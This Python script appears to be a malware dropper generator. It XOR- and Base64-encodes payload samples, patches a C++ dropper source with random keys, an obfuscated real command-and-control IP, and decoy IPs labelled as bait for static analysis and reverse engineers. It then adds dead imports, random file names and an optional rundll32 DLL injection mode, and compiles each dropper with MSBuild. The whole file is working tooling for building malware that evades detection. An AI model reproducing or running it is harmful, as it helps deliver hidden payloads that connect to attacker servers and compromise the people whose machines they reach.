import os
import base64
import subprocess
import shutil
import random
import re
import argparse
import hashlib
import struct
import csv
from datetime import datetime

RESOURCE_FILE = r"C:\Users\krv\payload.bin"
MSBUILD = r"C:\Program Files\Microsoft Visual Studio\18\Community\MSBuild\Current\Bin\amd64\MSBuild.exe"
PROJECT = r"C:\Users\krv\source\repos\Dropper\filesystem.exe\droppertest\droppertest\droppertest.vcxproj"
BUILT = r"C:\Users\krv\source\repos\Dropper\filesystem.exe\droppertest\droppertest\x64\Release\droppertest.exe"
SOURCE = r"C:\Users\krv\source\repos\Dropper\filesystem.exe\Dropper\Dropper\Source.cpp"

DEFAULT_INPUT_DIR = r"C:\Users\krv\samples"
DEFAULT_OUTPUT_DIR = r"C:\Users\krv\output"
DEFAULT_IP_XOR_KEY = 0x41
DEFAULT_IP2_XOR_KEY = 0x41
DEFAULT_PRIMARY_IP = "192.168.56.1"
DEFAULT_REAL_IP = "192.168.56.1"
DEFAULT_DECOY_IP = "192.168.56.1"
DEFAULT_NAME_SIZE = 10
DEFAULT_SERVER_PORT = 4444
DEFAULT_BACKUP_PORT = 4444


def compute_hash(filepath):
    h = hashlib.sha256()
    with open(filepath, "rb") as f:
        for chunk in iter(lambda: f.read(8192), b""):
            h.update(chunk)
    return h.hexdigest()


def is_dll(filepath):
    try:
        with open(filepath, "rb") as f:
            if f.read(2) != b'MZ':
                return False
            f.seek(0x3C)
            pe_offset = struct.unpack('<I', f.read(4))[0]
            f.seek(pe_offset + 0x16)
            characteristics = struct.unpack('<H', f.read(2))[0]
        return bool(characteristics & 0x2000)
    except Exception:
        return False


def write_log(log_path, record):
    file_exists = os.path.isfile(log_path)
    with open(log_path, "a", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=record.keys())
        if not file_exists:
            writer.writeheader()
        writer.writerow(record)


def xor_encode_ip(ip_str, key):
    encoded = [b ^ key for b in ip_str.encode()]
    return "{" + ", ".join(hex(b) for b in encoded) + "}"


def toggle_define(source, name, enabled):
    if enabled:
        return re.sub(rf'^//#define {name}\b', f'#define {name}', source, flags=re.MULTILINE)
    else:
        return re.sub(rf'^#define {name}\b', f'//#define {name}', source, flags=re.MULTILINE)


def patch_source(source, xor_key, primary_ip, real_ip, real_ip_key, decoy_ip, decoy_ip_key,
                 inject=False, xor_encode=True, base64_encode=True, random_name=True,
                 dead_imports=True, name_size=10, server_port=4444, backup_port=4444):
    source = re.sub(r"#define XOR_KEY 0x[0-9a-fA-F]+",
                    f"#define XOR_KEY {hex(xor_key)}", source)
    source = re.sub(r'#define PRIMARY_IP "[^"]*"',
                    f'#define PRIMARY_IP "{primary_ip}"', source)
    encoded_real = xor_encode_ip(real_ip, real_ip_key)
    source = re.sub(r"#define IP_XOR_KEY 0x[0-9a-fA-F]+",
                    f"#define IP_XOR_KEY {hex(real_ip_key)}", source)
    source = re.sub(r"#define ENCODED_IP \{[^}]+\}",
                    f"#define ENCODED_IP {encoded_real}", source)
    source = re.sub(r"#define ENCODED_IP_LEN \d+",
                    f"#define ENCODED_IP_LEN {len(real_ip)}", source)
    encoded_decoy = xor_encode_ip(decoy_ip, decoy_ip_key)
    source = re.sub(r"#define IP2_XOR_KEY 0x[0-9a-fA-F]+",
                    f"#define IP2_XOR_KEY {hex(decoy_ip_key)}", source)
    source = re.sub(r"#define ENCODED_IP2 \{[^}]+\}",
                    f"#define ENCODED_IP2 {encoded_decoy}", source)
    source = re.sub(r"#define ENCODED_IP2_LEN \d+",
                    f"#define ENCODED_IP2_LEN {len(decoy_ip)}", source)
    source = re.sub(r"#define NAME_SIZE \d+",
                    f"#define NAME_SIZE {name_size}", source)
    source = re.sub(r"#define SERVER_PORT \d+",
                    f"#define SERVER_PORT {server_port}", source)
    source = re.sub(r"#define BACKUP_PORT \d+",
                    f"#define BACKUP_PORT {backup_port}", source)
    source = toggle_define(source, "INJECT", inject)
    source = toggle_define(source, "XOR_ENCODE", xor_encode)
    source = toggle_define(source, "BASE64", base64_encode)
    source = toggle_define(source, "RANDOM_NAME", random_name)
    source = toggle_define(source, "DEAD_IMPORTS", dead_imports)
    return source


def main():
    parser = argparse.ArgumentParser(description="Dropper generator")
    parser.add_argument("--ip1", required=True,
                        help="Plain string IP embedded in binary (static analysis bait)")
    parser.add_argument("--ip2", required=True,
                        help="Real connection IP, obfuscated (dynamic analysis)")
    parser.add_argument("--ip3", required=True,
                        help="Secondary obfuscated IP, no connection (reverser bait)")
    parser.add_argument("--input-dir", default=DEFAULT_INPUT_DIR,
                        help=f"Folder containing payload samples (default: {DEFAULT_INPUT_DIR})")
    parser.add_argument("--output-dir", default=DEFAULT_OUTPUT_DIR,
                        help=f"Folder to write built droppers (default: {DEFAULT_OUTPUT_DIR})")
    # inject: None = auto-detect from PE header, True = force DLL, False = force EXE
    inject_group = parser.add_mutually_exclusive_group()
    inject_group.add_argument("--inject", dest="inject", action="store_true", default=None,
                              help="Force DLL mode via rundll32 (overrides auto-detect)")
    inject_group.add_argument("--no-inject", dest="inject", action="store_false",
                              help="Force EXE mode via CreateProcess (overrides auto-detect)")
    parser.add_argument("--xor", action="store_true", default=True,
                        help="XOR encode payload (default)")
    parser.add_argument("--no-xor", dest="xor", action="store_false",
                        help="Disable XOR encoding")
    parser.add_argument("--base64", action="store_true", default=True,
                        help="Base64 encode payload (default)")
    parser.add_argument("--no-base64", dest="base64", action="store_false",
                        help="Disable Base64 encoding")
    parser.add_argument("--random-name", action="store_true", default=True,
                        help="Use random dropped file name (default)")
    parser.add_argument("--no-random-name", dest="random_name", action="store_false",
                        help="Use fixed dropped file name 'proc'")
    parser.add_argument("--dead-imports", action="store_true", default=True,
                        help="Include dead import section (default)")
    parser.add_argument("--no-dead-imports", dest="dead_imports", action="store_false",
                        help="Disable dead import section")
    parser.add_argument("--name-size", type=int, default=DEFAULT_NAME_SIZE,
                        help=f"Random name character length (default: {DEFAULT_NAME_SIZE})")
    parser.add_argument("--server-port", type=int, default=DEFAULT_SERVER_PORT,
                        help=f"Real connection port (default: {DEFAULT_SERVER_PORT})")
    parser.add_argument("--backup-port", type=int, default=DEFAULT_BACKUP_PORT,
                        help=f"Decoy port (default: {DEFAULT_BACKUP_PORT})")
    args = parser.parse_args()

    os.makedirs(args.output_dir, exist_ok=True)
    log_path = os.path.join(args.output_dir, "build_log.csv")
    seen_hashes = {}  # hash -> first filename that had it

    for filename in os.listdir(args.input_dir):
        filepath = os.path.join(args.input_dir, filename)
        if not os.path.isfile(filepath):
            continue

        print(f"[*] Processing {filename}")

        # Deduplication
        file_hash = compute_hash(filepath)
        if file_hash in seen_hashes:
            print(f"[!] Skipping {filename} — duplicate of {seen_hashes[file_hash]} (same SHA-256)")
            continue
        seen_hashes[file_hash] = filename

        # Auto-detect EXE vs DLL
        file_is_dll = is_dll(filepath)
        if args.inject is None:
            inject = file_is_dll
            print(f"[*] Auto-detected: {'DLL' if inject else 'EXE'} mode")
        else:
            inject = args.inject
            if inject and not file_is_dll:
                print(f"[!] Error: --inject (DLL mode) requested but {filename} is not a DLL. Skipping.")
                continue
            if not inject and file_is_dll:
                print(f"[!] Warning: --no-inject (EXE mode) requested but {filename} appears to be a DLL.")

        # Random keys per build
        xor_key = random.randint(1, 255)
        ip_xor_key = random.randint(1, 255)
        ip2_xor_key = random.randint(1, 255)
        print(f"[*] XOR key: {hex(xor_key)}")
        print(f"[*] IP XOR key (real): {hex(ip_xor_key)}")
        print(f"[*] IP2 XOR key (decoy): {hex(ip2_xor_key)}")

        # Patch Source.cpp
        with open(SOURCE, "r") as f:
            source = f.read()
        source = patch_source(
            source,
            xor_key=xor_key,
            primary_ip=args.ip1,
            real_ip=args.ip2,
            real_ip_key=ip_xor_key,
            decoy_ip=args.ip3,
            decoy_ip_key=ip2_xor_key,
            inject=inject,
            xor_encode=args.xor,
            base64_encode=args.base64,
            random_name=args.random_name,
            dead_imports=args.dead_imports,
            name_size=args.name_size,
            server_port=args.server_port,
            backup_port=args.backup_port,
        )
        with open(SOURCE, "w") as f:
            f.write(source)

        # Encode payload
        with open(filepath, "rb") as f:
            raw = f.read()
        data = raw
        if args.xor:
            data = bytes([b ^ xor_key for b in data])
        if args.base64:
            data = base64.b64encode(data)
        with open(RESOURCE_FILE, "wb") as f:
            f.write(data)

        # Compile
        result = subprocess.run([
            MSBUILD, PROJECT,
            "/p:Configuration=Release",
            "/p:Platform=x64",
            "/t:Rebuild",
            "/verbosity:minimal"
        ], capture_output=True, text=True)

        if result.returncode != 0:
            print(f"[!] Build failed for {filename}")
            print(result.stdout)
            continue

        out_name = f"{filename}_dropper.exe"
        out_path = os.path.join(args.output_dir, out_name)
        shutil.copy(BUILT, out_path)
        print(f"[+] Done: {out_path}")

        # Log
        write_log(log_path, {
            "timestamp": datetime.now().isoformat(),
            "source_file": filename,
            "source_hash": file_hash,
            "output_file": out_name,
            "inject": inject,
            "xor_encode": args.xor,
            "xor_key": hex(xor_key),
            "ip_xor_key": hex(ip_xor_key),
            "ip2_xor_key": hex(ip2_xor_key),
            "base64": args.base64,
            "random_name": args.random_name,
            "dead_imports": args.dead_imports,
            "name_size": args.name_size,
            "server_port": args.server_port,
            "backup_port": args.backup_port,
            "ip1": args.ip1,
            "ip2": args.ip2,
            "ip3": args.ip3,
        })

    # Reset Source.cpp to defaults
    with open(SOURCE, "r") as f:
        source = f.read()
    source = patch_source(
        source,
        xor_key=0x73,
        primary_ip=DEFAULT_PRIMARY_IP,
        real_ip=DEFAULT_REAL_IP,
        real_ip_key=DEFAULT_IP_XOR_KEY,
        decoy_ip=DEFAULT_DECOY_IP,
        decoy_ip_key=DEFAULT_IP2_XOR_KEY,
        inject=True,
        xor_encode=True,
        base64_encode=True,
        random_name=True,
        dead_imports=True,
        name_size=DEFAULT_NAME_SIZE,
        server_port=DEFAULT_SERVER_PORT,
        backup_port=DEFAULT_BACKUP_PORT,
    )
    with open(SOURCE, "w") as f:
        f.write(source)

    print("[*] Source.cpp reset to defaults")
    if os.path.exists(RESOURCE_FILE):
    	os.remove(RESOURCE_FILE)
    print("[*] Cleaned up payload.bin")
    print(f"[*] Build log written to {log_path}")
    print("[*] All samples processed.")


if __name__ == "__main__":
    main()
